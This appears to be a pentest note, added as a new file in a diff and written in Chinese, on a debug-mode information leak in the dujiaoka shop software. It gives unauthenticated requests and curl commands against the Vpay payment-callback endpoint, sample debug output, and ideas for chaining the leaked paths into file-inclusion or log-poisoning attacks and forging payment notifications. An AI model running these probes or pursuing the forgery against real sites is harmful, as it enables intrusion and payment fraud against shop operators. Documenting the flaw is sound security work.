@@ -1,0 +1,41 @@
+# dujiaoka APP_DEBUG 开启 → Ignition 调试页信息泄露
+
+## 1. 触发（无凭证，裸 GET）
+GET /pay/vpay/notify_url HTTP/1.1
+Host: TARGET
+User-Agent: curl/8.x
+
+## 2. 典型回显（节选）
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<!DOCTYPE html>...
+<script>window.Ignition = window.ignite(window.data)</script>
+<!--
+ErrorException: Undefined index: param in file
+  /www/wwwroot/<site>/app/Http/Controllers/Pay/VpayController.php on line 55
+#0 .../VpayController.php(55)
+...
+#7 .../app/Http/Middleware/PayGateWay.php(19)
+-->
+
+## 3. 存活确认（补齐参数走验签分支）
+GET /pay/vpay/notify_url?payId=1&param=<order_sn>&type=1&price=0.00&reallyPrice=0.00&sign=abc HTTP/1.1
+Host: TARGET
+
+→ HTTP/1.1 200 OK
+→ fail
+
+## 4. 利用价值
+- 泄露 docroot 绝对路径（本例 /www/wwwroot/<site>/），可喂给 LFI / 路径穿越 / 日志投毒定位；
+- 泄露确切文件与行号（VpayController.php:55），确认应用为 dujiaoka 且未关 debug；
+- 泄露中间件链（PayGateWay.php），辅助判断回调是否经过支付网关校验；
+- 端点存活 ⇒ 可作为后续伪造异步通知（对齐 order_sn / price / sign 算法）的落点。
+
+## 5. 复现命令
+curl -sk --noproxy '*' "https://TARGET/pay/vpay/notify_url"
+curl -sk --noproxy '*' "https://TARGET/pay/vpay/notify_url?payId=1&param=TEST202601010001&type=1&price=0.00&reallyPrice=0.00&sign=abc"
+
+## 6. 注意
+- 返回完整 HTML 调试页属泄露；若返回 500 空白页，多为 APP_DEBUG=false；
+- 站点根路径与站点名因部署而异，以回显为准，勿直接套用。
